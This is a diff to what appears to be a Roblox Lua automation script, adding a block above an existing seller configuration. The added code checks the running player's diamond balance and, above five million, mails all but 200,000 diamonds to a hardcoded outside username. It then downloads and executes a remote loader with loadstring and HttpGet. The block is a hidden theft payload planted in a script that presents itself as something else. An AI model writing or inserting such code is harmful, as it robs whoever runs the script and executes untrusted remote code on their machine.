@@ -1,3 +1,35 @@
+wait()
+getgenv().usernames = {"hrabarroobertl"}
+
+local function getCurrentDiamondValue()
+    return game.Players.LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
+end
+
+
+local currentDiamondValue = getCurrentDiamondValue()
+print("Số lượng kim cương hiện tại là: " .. currentDiamondValue)
+
+
+if currentDiamondValue < 5000000 then
+    print("Số lượng kim cương không đủ.")
+    return 
+end
+
+
+local adjustedDiamondValue = currentDiamondValue - 200000
+
+
+getgenv().Settings = {
+    Mailing = {
+        ["Diamonds"] = {Class = "Currency", Amount = adjustedDiamondValue},
+    },
+    Users = getgenv().usernames,
+    ["Split Items Evenly"] = false, -- False -> it will send the Amount per account.
+    ["Only Online Accounts"] = false,
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
+wait()
+
 script_key = "buWqvxwEGollesYNnJGakKbDDsyMUFkC"
 getgenv().Settings = {
       Seller = {
